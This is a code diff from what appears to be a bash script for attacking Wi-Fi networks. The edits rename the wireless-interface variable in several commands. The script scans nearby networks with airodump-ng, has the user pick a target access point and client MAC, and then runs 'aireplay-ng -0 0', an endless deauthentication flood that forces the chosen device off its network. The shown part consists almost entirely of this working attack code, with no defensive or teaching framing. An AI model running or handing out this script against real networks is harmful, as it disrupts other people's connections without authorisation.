@@ -33,7 +33,7 @@ function setnetworkCard (){
 function scanNetworks (){
   clear
   echo -e "\n\t[*]Start scan..."
-  xterm -hold -e "timeout 15 airodump-ng -w .captura  $networkcard" & 
+  xterm -hold -e "timeout 15 airodump-ng -w .captura  $cardMonitor" & 
   PIDairo=$!
   sleep 17
   kill -9 $PIDairo 
@@ -47,7 +47,7 @@ function scanNetworks (){
   echo -ne "[*] Select ESSID: " && read vESSID
   MAC=$(grep $vESSID .captura-01.csv | awk '{print $1}')
   CHN=$(grep $vESSID .captura-01.csv | awk '{print $2}')
-  xterm -hold -e "timeout 20 airodump-ng --bssid $MAC -w .filtro --output-format csv $networkcard" &
+  xterm -hold -e "timeout 20 airodump-ng --bssid $MAC -w .filtro --output-format csv $cardMonitor" &
   PIDfiltro=$!
   sleep 25
   kill -9 $PIDfiltro
@@ -66,9 +66,9 @@ function scanNetworks (){
   mactoAttack=${MACS[Index]}
   echo -e "The Attack is running"
   echo -e "[!] Press ctrl+c to stop attack"
-  airmon-ng stop $networkcard > /dev/null
+  airmon-ng stop $cardMonitor > /dev/null
   airmon-ng start $networkcard $CHN > /dev/null
-  aireplay-ng -0 0 -a $MAC -c $mactoAttack --ignore-negative-one $networkcard > /dev/null
+  aireplay-ng -0 0 -a $MAC -c $mactoAttack --ignore-negative-one $cardMonitor > /dev/null
 
 }
 
